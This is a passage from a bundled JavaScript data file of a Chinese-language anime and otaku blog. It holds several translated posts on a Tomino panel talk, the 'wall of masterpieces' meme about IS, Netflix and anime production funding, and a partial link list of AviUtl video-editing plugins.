裡進行著突發活動。</p>\n<p>因為是宮崎所以只用了標題而內容會是完全不同的東西（實際上似乎是冒險譚）</p>\n<p>富野：所以像我這種對政治無關心的人才能活下來。</p>\n<p>福嶋：所以宮崎才離開了電視圈。</p>\n<p>宇野：宮崎處在一種獵奇的狀況裡。試圖去描寫不存在的夢想的戰後。有著對於教養的欲望，但沒有教養的內在。沒有實體而只是說著「教養很重要」。那麼就用兩小時電影去重製『阿爾卑斯的少女海地』吧。</p>\n<p>富野：突發終究就是突發。我沒能憧憬岩波。現在也是為何文科省會如此地官僚化呢。</p>\n<p>福嶋：京都大學已經只是所地方大學了（福嶋出身於京都大學）。只有著身為知識份子的自尊。</p>\n<p>國分：要怎麼樣才能想出獲取知性的路徑。要去「思考現實」嗎，應該要帶著什麼樣的裝備。</p>\n<p>富野：短期戰是沒用的。這是百年之計，必須要從教育論下手的麻煩事。我認為應該要提高到社會議題的等級，但那是你們要做的事情啊。</p>\n<p>國分：久違地聽到了百年之計這個詞。這很重要。</p>\n<p>宇野：不要一直挑釁，而是試圖和電視打好關係嗎（被監督說了要好好相處，「都被監督這樣說了就不得不這樣做了」→ 會場爆笑）。</p>\n<p>富野：擁有能夠發言的場所是很重要的。僅只是拜託你們理解吧！是不行的（宇野「從電視上離開的是鋼彈。是突發」）。『鋼彈』有著保護罩，但你沒有保護罩。會被殺的。現實主義是很恐怖的。沒有虛構的保護罩。</p>\n<p>宇野：如果是 30 年前就不行了吧。現在有出路。以前只有影像這個出路，現在不同了。能夠發言的場所已經不只是電視了（福嶋 「阿諛的媒體。甚至會刺激到網路右翼酸民」。現在的好處是除了虛構之外現實也有逃避之路。</p>\n<p>富野：然而這是公眾的問題，雖然已經被細分化了仍是公開的（宇野 「這是您的關係。『鋼彈』處在機器人動畫這個框架裡把所有的規範都完全打破了」）。我沒有做抽煙和床戲。『伊甸巨神發動篇』雖然沒能在電視上播放，那是因為光影效果的問題。之後做了修正而播放。</p>\n<p>宇野：往後我不會再寫這樣（像是『母性的反烏托邦』）的書。已經覺得滿足了。在這之後會沒辦法寫出能斷言「不是～」的書。但是日本現在只能以「不是～」這樣的話語合為一體。</p>\n<p>國分：宇野是文學家。不是評論家。所以會想去尋找新的、下一個。</p>\n<p>宇野：也就是成為吉本隆明。但文學性的和文學是不同的。還有也有（國分）要求我寫『方丈記』。</p>\n<p>山本寬（抵達會場）：現在說什麼都會炎上的我。我的世代是試圖使其容易理解的世代。我只看了幾話 G 復國。但是年輕人說了「雖然看不懂卻很有趣」。民粹主義就是試圖使其容易理解才會是民粹主義。上個世代的所有東西都搞不懂。現在也試圖和另外三個人一同弄得好懂。話語、描寫。搞不懂的東西才是重要的吧。政治虛構作品。被丟話的時候，監督回答「因為這是工作」。不會將它弄得好懂。在這個空間裡戰鬥至今的世代。</p>\n<p>國分：我也放棄將困難的事情弄得好懂了。這樣才會有難以理解的重量。</p>\n<p>富野：難以理解就是好，這樣的果然還是錯的。近代大幅改變的日本沒能成功編織話語，因而變成了悽慘的知識份子。國家需要有軍隊卻放棄了。高貴的義務，雖然戰敗了但軍隊是必要的，應該要抱有這樣爭論的高貴話語。</p>\n<p>宇野：我不會去讀蓮實重彥的東西。裡面講的盡是不要將影像語言化的理所當然的事情。而對於不能理解的東西，也有著能附上動機的話語。若是在這點上失敗就會成為後期的押井守。像是『空中殺手』那樣的。所以必須要將易懂的話語累積起來。為了讓其能附上欲望的話語。現在的自我啟發書裡盡是只有「加油！」和「取得平衡」的東西。每個都是 100%正確的。但那有怎樣。要思考的並不是這個。重要的是過程。</p>\n<p>國分：難以理解是以結果來說。而不害怕這點是很重要的。</p>\n<p>富野：必須要努力讓它容易理解。但對方的程度會有高低。而必須要讓它命中。隨著程度上升世界也必須要將文化論的程度提升。必須要知道接收者的程度高低。不能只把粉絲和信徒當成對象。</p>\n<p>國分：我看了 G 復國，覺得帶來了活力。</p>\n<p>富野：這樣一說我很高興。我很高興和兩位見面，讓我想起 10 年前在北京大學的談話。和當時的學生們有著同樣眼神的人們現在在這裡。我很高興。能夠互相理解。身體變得很輕鬆。我會一直工作到死的（會場拍手）。</p>\n","date":"2019-02-12T07:11:50.000Z","excerpt":"","printDate":"February 12, 2019","printReadingTime":"1 min read"};

var route_12 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod38
});

var Mod39 = {"title":"【譯】中國人們稱為「名作之壁」的《IS》","slug":"ACG-what-does-wall-of-meisaku-mean","html":"<p>文章來源：<a target=\"_blank\" rel=\"nofollow\" href=\"http://blog.livedoor.jp/kashikou/archives/51976215.html\">http://blog.livedoor.jp/kashikou/archives/51976215.html</a></p>\n<hr>\n<p>正巧有人問了我「中國御宅族偶爾會說的『名作之壁』，指的是什麼呢？」，這次我們來聊聊這件事吧。</p>\n<p>「名作之壁」這個中國御宅用語通常是對於《IS〈Infinite Stratos〉》的戲謔性稱呼。廣義上（？）則是指「沒什麼內容，看不出其優點在哪裡卻獲得高人氣、收視率，光碟也賣得很好」的作品。結合起來就是光碟沒有賣得比這部作品好的話，不論那部作品有多棒，都會被貶為「稱不上是名作」。</p>\n<p>下面我隨手翻個在中國的討論網站上，關於「名作之壁這個詞彙」的討論情況作為介紹。</p>\n<hr>\n<blockquote>\n<p>常常看到別人在講的「名作之壁」是什麼意思？\n我以為是講某部特定的作品，但又好像不全是這樣…</p>\n<p>——</p>\n<p>「名作之壁」基本上可以當成是在指《IS》，就像「宇宙神作」是指《魔法禁書目錄》，「山本遺作」是指《碎之星》一樣。雖然這個詞也會拿來指其它作品，總之先有這樣的認識就好了。</p>\n<p>——</p>\n<p>指的是《IS》或像《IS》這種沒什麼亮眼之處的後宮作品，卻有很高的人氣、收視率、光碟銷量的作品。</p>\n<p>——</p>\n<p>原來如此，那為什麼大家會這樣稱呼《IS》，後來又變成當梗來玩？</p>\n<p>——</p>\n<p>《IS》的故事設定沒有什麼特別的地方，也沒有鋪陳深度。甚至可以不客氣地說它是部無聊、低俗的作品，只是部滿滿的殺必死和後宮畫面的機人動畫。但《IS》卻打出了相當亮眼的銷售成績。\n有了《IS》這麼好的成績，其它作品不管有多麼優秀，賣得沒有《IS》好的話，就沒辦法自豪地誇讚那「優秀的部份」。也就是說，沒辦法超越《IS》的作品就無法成為名作。而以《IS》為首的同性質作品則被稱為「名作之壁」……的感覺吧。</p>\n<p>——</p>\n<p>這套說法一開始只是玩梗居多，之後開始被人拿去貶損其它作品，直到最近才有拉回玩梗的感覺。這算是對作品吵嘴時吐槽光碟銷量用的梗吧。</p>\n<p>——</p>\n<p>這個詞一開始應該是從日本的 2ch 來的，不是我們的社群自創的。</p>\n<p>——</p>\n<p>但是我用日文去搜尋「名作之壁」也找不到原始文章。只有中文資料的「名作之壁」在講《IS》。</p>\n<p>——</p>\n<p>可能來源是跟日本 2ch 的銷量討論串有關吧。</p>\n<p>——</p>\n<p>日本會拿「○○ 之壁」排序，當成一種「無法跨越之壁」的梗。</p>\n<p>——</p>\n<p>我記得一開始「名作之壁」的確是日文來的，下面是「各季的霸權動畫」。本來應該是吹捧作品的光碟銷量有多厲害的複製文吧？</p>\n<p>——</p>\n<p>這個詞會廣為流傳也是因為當時中國沒什麼在討論《IS》，卻在日本人氣爆發吧。為什麼那種作品會大熱門呢。</p>\n<p>——</p>\n<p>不，日本網民也有很多人在吐槽這部作品，但也同時在享受著這部作品。不像中國是否定這部作品後就結束了，而是一邊吐槽一邊享受著萌吧？\n當時日本的粉絲還有各個角色的「黨派」，進行強烈的黨爭。該怎麼說呢……把自己被萌到的，或者說很廚的、有點糟糕的一面曬出來，以此為樂的獨特文化吧。</p>\n<p>——</p>\n<p>中國會以故事的優點和深度進行評價，但相當排斥萌角色，所以像《IS》這樣的作品就會被排除在外，日本就不會這樣。尤其是以男性為目標的作品，萌系作品在中國會更難賣吧。</p>\n<p>——</p>\n<p>日本還會有對萌系角色的官方外傳創作、相關週邊、粉絲的社群創作。中國沒有這樣的東西所以才會對《IS》有種不相容感吧。</p>\n<p>——</p>\n<p>我記得當時《IS》的平均銷量是 3 萬片到 4 萬片吧。連《俺妹》和《超電磁砲》也沒這麼高。\n日本動畫整體看來也沒什麼作品能賣得比這還多。深夜動畫的話就只有《魔法少女小圓》或《輕音部！》這種等級的作品了。才會變成門檻吧。</p>\n<p>——</p>\n<p>這也會被拿來批評說《超電磁砲》不是名作。明明《超電磁砲》除了在中國之外，在海外也有很強的影響力，而且粉絲也很多啊…</p>\n<p>——</p>\n<p>而且這銷量排行榜看的是每一卷的首週銷量，還是全套銷量的累計也有差異。有附特典的第一卷都會賣得很好，盒裝版發售之後也會有變化。\n日本的御宅族業界也有以光碟以外的銷量為主的作品，只看光碟銷量也不準。雖然我記得有看過銷量超過 5000 片就有機會作第 2 季的說法。</p>\n<p>——</p>\n<p>《IS 2》的首動超過 2 萬片也被拿來當成是「名作之壁」的樣子。 2013 年的 10 月動畫除了連播 2 季的動畫之外，這部應該是銷量之首吧？</p>\n<p>——</p>\n<p>我認為是因為中國也能理解的資料，只有銷量這種有容易理解的數字的東西，所以特別強調銷量的《IS》的「名作之壁」這個詞才自己越走越遠吧。</p>\n<p>——</p>\n<p>《IS》厲害的除了動畫之外還有原作輕小說的銷量。\n雖然原作者的暴走也是原因之一，但它也是創立起新的輕小說品牌，拉攏其它公司作品等級的作品啊。</p>\n<p>——</p>\n<p>果然要精確掌握日本的作品評價還是件很難的事。要到哪裡去看哪的部份的東西才能理解日本動畫業界的資料呢？</p>\n<p>——</p>\n<p>《IS》雖然大家嘴成那樣但還是一部相當平衡的萌作良作啊。粉絲自己拿「名作之壁」來玩梗是還好，但真的不想看到有人拿這個來攻擊。是可以去嘴作者啦。</p>\n<p>——</p>\n<p>總之這個詞有些人是當梗在玩，但《IS》的確某種性質上也像是「名作之壁」的守門員。而這種容易理解的形像也的確自己越走越遠了。</p>\n</blockquote>\n<hr>\n<p>嗯，大概是這種感覺吧。當時日本因為《IS》放映讓「萌豚」這個詞在網路上流傳開來，中國則是讓「名作之壁」這個和銷量有關的詞廣為人知，挺有趣的。</p>\n<p>而我之前從中國御宅聽到的是，「名作之壁」這個詞通常是諷刺那些高談作品光碟銷量的人。</p>\n<p>我之前也曾經介紹過好幾次中國御宅族對於自己熱中、沉迷的作品會有很強烈的「有價值」、「正確的」、「御宅族的王道」的傾向，而「在日本得到什麼樣的評價」會被他們當成補強論點的材料。</p>\n<p>所以他們會非常地關注日本人的評價與相關資訊，以及（看似）能當成支持證據、由日本媒體所發表的動畫光碟銷量，並過度地把銷量當成是對於作品的評價。</p>\n<p>雖然日本也是有在意自己喜歡的作品多優秀，和其它作品相較如何的情況，但在中國御宅族社群裡這種情感可說比日本強烈不少。</p>\n<p>大概是這樣。靜候您的吐槽與資訊提供。</p>\n","date":"2020-07-04T20:18:43.000Z","excerpt":"","printDate":"July 4, 2020","printReadingTime":"1 min read"};

var route_20 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod39
});

var Mod40 = {"title":"【譯】Netflix 會成為動畫從業者窮困問題的救世主嗎？動畫業界的「真正問題」","slug":"ACG-would-netflix-be-the-saviour-of-anime","html":"<p>文章來源：<a target=\"_blank\" rel=\"nofollow\" href=\"https://www.businessinsider.jp/post-164211\">【独占】ネットフリックスはアニメーター貧困問題の救世主か？ アニメ業界の&quot;本当の課題&quot; —— ｢けもフレ｣福原 P インタビュー</a></p>\n<hr>\n<p>在 NicoNico 動畫上 1 集播放次數超過 1000 萬次，襲捲了 2017 年動畫業界的人氣作品『動物朋友』。負責其制作的八百萬工作室的製作人福原慶匡，推出了新書<a target=\"_blank\" rel=\"nofollow\" href=\"https://www.amazon.co.jp/dp/406511439X/ref=as_li_ss_tl?ie=UTF8&amp;linkCode=ll1&amp;tag=gj09-22&amp;linkId=52d507b1ad8c694a022eea3d7ad38f37&amp;ref=mgac2017\">『來成為動畫製作人吧！動畫「製作(商業)」結構揭秘』</a>。</p>\n<p>福原在新書裡所闡述的是，製作人應該要以「新的技能組」應對襲向日本動畫商業的巨大變化浪潮。這次我們將透過福原製作人的視點一探究竟，以網飛（Netflix）為首的「外資資金」、中國製的動畫現況，以及製作委員會所抱有的問題。</p>\n<h2 id=\"動畫的「製作委員會模式」並不單是＂掏空中流業者＂\">動畫的「製作委員會模式」並不單是＂掏空中流業者＂</h2>\n<p>—— 您怎麼看待網路上相當有人氣的｢製作委員會｣掏空論點？</p>\n<p>福原：我認為（作為製作委員會的）他們並不是有意圖地去掏空的，而是對於製作動畫而言是必要的組織。製作委員會支撐了動畫業界發展至今這點是不會錯的。</p>\n<p>但是，動畫經濟會隨著時代一同改變。而到了現在製作委員會的組成和經濟構造也有了相當大的改變。例如這 10 年來，資金提供者已經開始從電視台、DVD 承接商、柏青哥轉向外資系的串流業者（Netflix、Amazon、Hulu）。</p>\n<p>在這樣的情況下，｢除了動畫委員會方式以外沒有其它製作動畫的選項｣的現況，我認為是有些缺乏自由度的。若是可以有其它新的資金調度模型，我想也是挺好的。</p>\n<h2 id=\"1-集動畫，其實需要現在價位-2-倍以上的成本？\">1 集動畫，其實需要現在價位 2 倍以上的成本？</h2>\n<p>（雖然一般來說認為深夜動畫 1 集的制作費是 1500 万円〜左右）我常和其他製作人聊到，｢假設我們提供給所有的工作人員常識性的休假與薪資，1 集的正確制作費其實會需要 4000 万円左右｣（※1）。那麼 1 部作品（1 季＝ 13 話）就會需要組成 5 億円規模的製作委員會，而每季裡能夠回收這種規模投資的作品僅有數部而已。（譯註: 近年每季動畫播放的數量從 40－60 部不等，18 年春播映的動畫更高達 74 部）</p>\n<blockquote>\n<p>※1: 日本的動畫工作室經常被指摘，其資金力相較所經手製作作品的人氣和知名度是十分不足的。2015 年制作人氣作品『虐殺器官』的 Manglobe 破產、2017 年製作大人氣作品『少女與戰車』的｢Actas｣發生無法提供多數作品成品的困境之後，被 Bandai Visual 所收購。</p>\n</blockquote>\n<p>—— 原來如此。這麼一說，像現在每年有超過 200 部以上的動畫新作品，其實是不太好的嗎。</p>\n<p>福原：是的。只是，對於想要運用授權去大量拓展商業模式，以賺取手續費的窗口公司，或是想要販賣播放時間段的電視台來說，作品數量是越多越好。因此才會有現在這種大量動畫在播映的狀況。這也是造就過去最大的 2 兆 9 億円（資料與取自動畫產業報告 2017 匯整版（日文版））市場產值的原因。</p>\n<blockquote>\n<p>2016 年的｢動畫產業市場｣（整體使用者的消費額推測）有 2 兆 9 億円。然而｢動畫業界市場｣（動畫製作企業的產品銷售額推測）僅有 2301 億円。</p>\n</blockquote>\n<p>福原：（而在這種艱苦的狀況中，若製作工作室也想要拿到權利收入的錢）會有很多人認為，那麼工作室也出錢給｢製作委員會｣不就好了嗎。但是，說到頭就是大多數的製作工作室，手頭都沒有這麼多錢（※2）。</p>\n<p>在我的新書『來成為動畫製作人吧!』裡，我花了不少篇幅解說權利＝授權，因為我希望站在創作者這邊的製作人，能夠透過學習授權經濟，去改善這種構造，也就是不持有權利的製作工作室，陷於貧困惡性循環的狀況。</p>\n<blockquote>\n<p>※2: 為了湊齊每季約 2 億円的製作費，需要由數家公司一同組成製作委員會，但参與企業常會被要求至少出資 1000 万円以上。</p>\n</blockquote>\n<h2 id=\"netflix-的參入能夠解決動畫業者的貧困問題嗎？\">Netflix 的參入能夠解決動畫業者的貧困問題嗎？</h2>\n<p>—— 現在以 Netflix 為首的外資串流平台，正往動畫業界投入巨額資金。這樣的舉動能夠拯救動畫業者的困境嗎？</p>\n<p>福原：外資串流平台系配信能夠成為有前途的資金調度來源，這是時代巨大的轉捩點。而他們最令我們感心的是，目前他們｢我出錢但我不會主張除了串流權以外的權利｣的態度。他們只會要求能於一定時間內獨佔串流，並會只由這間公司就支付了整部作品的制作費用。讓工作室不必依賴製作委員會形式，也能讓作品發佈到這個世界。</p>\n<p>我最近在思考的是，從上述的方式再稍微往前進的，名為｢夥伴方式｣的資金調度方法。這指的是，透過事先販賣權利，預先調度到製作資金後，才開始進入製作，這樣子的預售形式的模式。</p>\n<p>我認為動畫在海外獲得相當高的評價的現在，是非常好的時間點。我們所必要的不只是串流，還有經營世界市場。</p>\n<p>現在有許多作品只需要將串流權販賣給串流業者，就能籌到大部份的製作費用。其它方面的發展可由自家公司擔起風險，也可販賣各種授權窗口的權利，例如音樂、書籍出版、實體活動等等的權利給其他公司（做為分散風險）。而這部份就需要仰賴製作人的手腕了。</p>\n<p>只是，宣傳一部動畫仍然需要相當多的協助者，我們仍然需要能同時做為協助者的出資者。因此我認為營造一個能與購買權利的企業一同進行夥伴會議的空間，藉此凝聚與委員會同等的組織力也是很重要的。</p>\n<p>—— 另一方面來說，如果採取的是製作委員會方式，就能在作品完成交出之前確保製作費，但像 Netflix 這樣的串流業者，基本上會是在作品完成、交出之後才付錢。金流面有哪些該如何應對的難題？</p>\n<p>福原：確實要完成、交出作品之後才能從串流平台那邊拿到錢。但也有讓對動畫有興趣的大型企業，以輔助資金（支援到完成為止時的資金來源）的身份參加委員會，他們能因為擔起出資風險得到回饋，並優先地得到委員會收入，這樣子的簽約方式（Cross Recoup 交叉補償方式）。這也是因為製作委員會在民法上屬非法人團體，才能達成這樣的自由的簽約形式。</p>\n<p>（雖然這個話題不太有人提到）在日本要確保製作費用的難點之一是，日本並不存在好萊塢那種｢保障完成公司｣。萬一作品無法完成時，沒有能夠分擔風險的機制。雖然能夠以和串流平台的合約為擔保向銀行借貸，因為問題導致製作中斷時，就必須面對留下的還貸風險。</p>\n<p>我認為往後應朝向如透過支撐資金得到大型企業的資助、在開始製作前先透過預售權利，籌足資金後確保能夠免除風險而開始製作...等等的方向，去探索如何建立這類由工作室主導的架構（制作動畫的機制）方法。</p>\n<h2 id=\"一旦錯過現在，就很難再有讓創作者取回主導權的機會\">一旦錯過現在，就很難再有讓創作者取回主導權的機會</h2>\n<p>—— 過往的製作委員會方式，若不是能夠容許動畫商業的高風險（＝能夠透過出資複數部作品以平均化可能的風險）的公司，是不太能夠參加的。而這時出現了串流平台這種全新的，並且是擁有資金力的贊助商，動畫產業也開始能有與至今的製作委員會不同的成員，也就是所謂異業種的公司參與的空間了。</p>\n<p>福原：是的。工作室藉由原作獲得原作印稅，或是持有權利獲得授權收入，（對於讓工作室健全化）是很重要的。然而現狀問題是大多數的情況下，工作室兩者都沒有。</p>\n<p>｢擁有原作｣並不一定需要像出版社這種巨大的組織。像八百萬有（因為動物朋友的大人氣而十分囑目的）達紀導演，十分積極地製作原創作品。也有做為經營戰略的自家輕小說和網路漫畫的品牌，這也是確保擁有原作的方法之一。</p>\n<p>無論如何，如果工作室得不到資源，動畫從業者的貧困境遇是無法改善的。我希望能讓更多人知道，夥伴方式能夠成為問題的突破口。而反過來說，我認為透過串流的「新的內容消費」所出現的機會——這是透過數位化帶來變化後的一大關鍵時刻，往後一段時間之內不會再有這種程度的進化——如果錯過了現在， 就很難再有讓創作者取回主導權的機會。</p>\n<p>動畫業界應該要有這樣的危機感。</p>\n<hr>\n<h2 id=\"補充參考：\">補充參考：</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.businessinsider.jp/post-164253\">■ 後編｢日本が直面する巨大アニメ市場『中国』の脅威 — — ｢けもフレ｣福原 P インタビュー｣に続く</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://nlab.itmedia.co.jp/nl/articles/1706/18/news001.html\">「諸悪の根源は製作委員会」ってホント？ アニメ制作における委員会の役割を制作会社と日本動画協会に聞いた (1/3)</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://dogadata.com/515\">テレビアニメ制作 製作委員会方式 図解 広告収入方式 お金の流れ</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.cric.or.jp/qa/hajime/hajime2.html\">著作者にはどんな権利がある？</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://books.google.com.tw/books?id=28c9DwAAQBAJ&amp;pg=PA144&amp;lpg=PA144&amp;dq=%E5%88%B6%E4%BD%9C%E5%A7%94%E5%93%A1%E4%BC%9A+%E6%AF%94%E7%8E%87&amp;source=bl&amp;ots=8emrD9m7Aw&amp;sig=ACfU3U1BxI4VMnSfqDJ0bh1fYeGnW5MBJw&amp;hl=zh-TW&amp;sa=X&amp;ved=2ahUKEwjGxevc2vnpAhVvy4sBHYiiB-4Q6AEwBXoECAoQAQ#v=onepage&amp;q&amp;f=false\">図解入門業界研究最新ｱﾆﾒ業界の動向とｶﾗｸﾘがよ〜くわかる本[第 2 版] — 谷口功, 麻生はじめ — Google 圖書</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://synapse-magazine.jp/television/2019anime01/\">Synapse 編集部が行く！日本アニメの現状 Vol.1 「製作委員会方式の成り立ちから、ネット配信まで」</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://toyokeizai.net/articles/-/347660\">ネットフリックスが｢アニメ｣を重視する理由</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://uzurainfo.han-be.com/index.html\">うずらインフォ</a></li>\n</ul>\n","date":"2019-12-27T19:18:57.000Z","excerpt":"","printDate":"December 27, 2019","printReadingTime":"1 min read"};

var route_9 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod40
});

var Mod41 = {"title":"強大的免費影片剪輯後製軟體 Aviutl","slug":"aviutl","html":"<h2 id=\"程式本體\">程式本體</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://spring-fragrance.mints.ne.jp/aviutl/\">AviUtl 主程式</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://spring-fragrance.mints.ne.jp/aviutl/\">拡張編集 File Reader (exedit.aui)</a>\n※延伸編輯插件 (拡張編集プラグイン) 解壓縮後的檔案請與 aviutl.exe 放在同一層級的資料夾下。\n解說：<a target=\"_blank\" rel=\"nofollow\" href=\"http://aviutl.info/dl-innsuto-ru/\">AviUtl と拡張編集プラグインの導入方法</a></li>\n</ul>\n<h3 id=\"常見檔案格式介紹\">常見檔案格式介紹</h3>\n<h3 id=\"專案檔\">專案檔</h3>\n<ul>\n<li><code>.aup</code>: Aviutl 內建的 project 檔案，最多可存放達 50 場景的整體作業狀態。\n在延伸編輯插件的視窗裡，右鍵點選<code>產生新 project (新規プロジェクトの作成)</code>，\n以及 Aviutl 本體視窗的<code>檔案 (ファイル)</code> → <code>儲存正在編輯的 project (編集プロジェクトの保存)</code> 所操作的都是這個格式的檔案。</li>\n<li><code>.exa</code>: <code>延伸編輯插件(拡張編集プラグイン)</code> 的設定參照檔案，\n例如替文字加上外框與影子後輸出成 <code>.exa</code> 參照檔案 (エイリアスを作成)，\n就可直接在加入新文字時選用參照設定，\n或是直接將 <code>.exa</code> 檔案拖進延伸編輯插件的視窗裡。\n通常儲存於 aviutl 資料夾底下的 <code>plugins</code> 資料夾的任意子資料夾。</li>\n<li><code>.exo</code>: 延伸編輯插件(拡張編集プラグイン)自有的 project 檔案，\n存放單一場景內的作業狀態，\n在延伸編輯插件的時間線上點選右鍵選擇<code>檔案 (ファイル)</code> → <code>輸出 object 檔案 (オブジェクトファイルのエクスポート)</code> 即輸出成此類型檔案。\n通常作為 object 輸入用，例如由 93 所製作<a target=\"_blank\" rel=\"nofollow\" href=\"http://seguimi.blog.fc2.com/blog-entry-632.html\">炫光特效 object</a>，\n通常儲存於 aviutl 資料夾底下的 <code>plugins</code> 資料夾裡。</li>\n</ul>\n<h3 id=\"腳本檔\">腳本檔</h3>\n<ul>\n<li>腳本檔案通常須存放在 aviutl 資料夾底下的 <code>scripts</code> 資料夾內才可使用，\n並且建議以作者或是效果去命名資料夾，區分為數眾多的檔案。</li>\n<li><code>.anm</code>: 動畫效果。有些腳本製作者會在腳本名稱後方標註用途，\n如 <code>@ANM1</code>、<code>@ANM2</code> 為汎用動畫效果，\n<code>@TA</code> 為使用於文字物件的動畫效果，\n<code>@音声</code> 為會與影片內的聲音聯動變化的動畫效果，\n<code>@加減速</code> 為調整加速與減數＂強弱＂用的動畫效果，\n<code>@連番</code> 為讀取連續圖片用的動畫效果。</li>\n<li><code>.obj</code>: 自訂物件。</li>\n<li><code>.scn</code>: 場景切換。</li>\n<li><code>.cam</code>: 鏡頭效果。</li>\n</ul>\n<h3 id=\"匯入檔案\">匯入檔案</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://pop.4-bit.jp/?page_id=7929\">L-SMASH Works File Reader (lwinput.aui)</a>\n可讀取許多泛用格式的影片檔案。\n解說：<a target=\"_blank\" rel=\"nofollow\" href=\"http://aviutl.info/l-smash-works/\">L-SMASH Works とは？導入方法と使い方</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://oov.github.io/aviutl_psdtoolkit/index.html\">PSDToolKit</a>\n可讀取 PSD 與字幕檔案。</li>\n</ul>\n<h3 id=\"輸出檔案\">輸出檔案</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://rigaya34589.blog.fc2.com/\">拡張 x264 出力(GUI) ex (x264guiEx)</a>\n解說：<a target=\"_blank\" rel=\"nofollow\" href=\"http://aviutl.info/x264guiex-intro/\">【AviUtl】x264guiEx の導入方法と使い方(2/3)【MP4 出力】</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://rigaya34589.blog135.fc2.com/\">ffmpeg / avconv 出力(ffmpegOut.auo)</a>\n解說：<a target=\"_blank\" rel=\"nofollow\" href=\"http://aviutl.info/ffmpegout/\">【AviUtl】FFmpegOUT で WebM･ASF･TS 形式の動画をエンコードする方法【出力プラグイン】</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.geocities.jp/aji_0/\">WMV 出力</a>\n解說：<a target=\"_blank\" rel=\"nofollow\" href=\"http://aviutl.info/wmv-puraguinn/\">【AviUtl】WMV 形式で動画をエンコードする方法【出力プラグイン】</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://auls.client.jp/\">PNG 出力</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://aviutl.info/ko-dekku-tigai/\">動画コーデックの種類と違い(H.264･VP9･MPEG･Xvid･DivX･WMV 等)【比較】</a>\ncodec 比較。</li>\n</ul>\n<h3 id=\"畫面濾鏡\">畫面濾鏡</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://nilposoft.info/aviutl-plugin/\">NL-Means Light</a>\n除噪。</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://nilposoft.info/aviutl-plugin/\">SharpenResize</a>\n能夠將縮放後的影片畫面處理得更加乾淨銳利，並可套用特定遮罩及除噪。</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://www40.atwiki.jp/aviutl41991/pages/37.html\">WarpSharpMT</a>\n解說：<a target=\"_blank\" rel=\"nofollow\" href=\"http://aviutl.info/sharp/\">【AviUtl】輪郭補正で動画の画質を向上させる方法【シャープ系フィルタプラグイン】</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://ch.nicovideo.jp/suisyou_P/blomaga/ar1137037\">【AviUtl ＋ x264guiEx】ニコニコ新仕様用 自己流エンコード設定【（く）対応】</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://aviutl.info/sharp/\">輪郭補正で動画の画質を向上させる方法</a></li>\n</ul>\n<h2 id=\"腳本、動畫效果\">腳本、動畫效果</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://aviutlscript.wiki.fc2.com/wiki/%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%88%E7%B4%B9%E4%BB%8B\">AviUtl スクリプト Wiki</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://scrapbox.io/aviutl/\">AviUtl Script Scrapbox</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://twitter.com/Respectrum93\">93</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://twitter.com/Aodaruma_\">Aodaruma</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://hazumurhythm.com/wev/downloads/\">rikky</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://twitter.com/undofish\">UndoFish</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://twitter.com/Tim_No_Heya\">ティム</a><a target=\"_blank\" rel=\"nofollow\" href=\"https://tim3.web.fc2.com/sidx.htm#DiaSha\">スクリプト置き場</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://purinka.work/download/hksy.html\">白水</a></li>\n<li>[Ψ(｀ ∀´)Ψ ｹｹｹ と (´･ω･`)ｼｮﾎﾞｰﾝ](<a target=\"_blank\" rel=\"nofollow\" href=\"http://madeinpc.blog50.fc2.com/\">http://madeinpc.blog50.fc2.com/</a>)</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://dic.nicovideo.jp/u/2787743#script\">さつきさんのページ</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://auf.jpn.xxxxxxxx.jp/\">AviUtl プラグイン フィルタ by うえぽん</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://takeshima.halfmoon.jp/room/aviutl.html\">AviUtl 物置 - JPN takeshima</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://niconicotetu.web.fc2.com/download_page.html\">AviUtl Script 開発無料カウンター</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://twitter.com/sdkd500/status/1042352681241591810?s=21\">VHS 風</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" 